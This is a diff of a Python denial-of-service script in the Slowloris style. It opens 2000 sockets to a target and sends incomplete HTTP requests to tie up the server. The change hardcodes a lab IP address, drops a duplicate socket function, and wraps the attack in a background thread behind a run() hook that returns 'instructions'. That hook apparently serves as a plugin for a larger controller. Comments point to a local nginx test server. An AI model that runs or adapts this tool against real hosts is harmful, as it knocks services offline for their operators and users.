@@ -6,6 +6,7 @@ import sys
 import time
 import socket
 import random
+import threading
 
 ###########################################################################################################################
 #################################################     INITIALIZATIONS     #################################################
@@ -35,23 +36,13 @@ def init_socket(ip):
 
     return sock
 
-def init_socket(ip):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect((ip, 80))
-
-    sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 4000)).encode("utf-8"))
-
-    for header in regular_headers:
-        sock.send("{}\r\n".format(header).encode('utf-8'))
-
-    return sock
-
 ###########################################################################################################################
 #####################################################     PROGRAM     #####################################################
 ###########################################################################################################################
 
 def main():
-    ip = sys.argv[1]
+    #ip = sys.argv[1]
+    ip = '10.0.2.15'
     socket_count = 2000
     log("Attacking {} with {} sockets".format(ip, socket_count))
 
@@ -86,7 +77,11 @@ def main():
 # Start the server (localhost:80): sudo systemctl start nginx.service
 # Check the status of the server: systemctl status nginx.service
 
-if __name__ == '__main__':
-    main()
+def run(): 
+    
+    thread = threading.Thread(target=main, daemon=True)
+    thread.start()
 
-def run(): return
+    return_data = "no_data"
+    next_action = "instructions"
+    return return_data, next_action
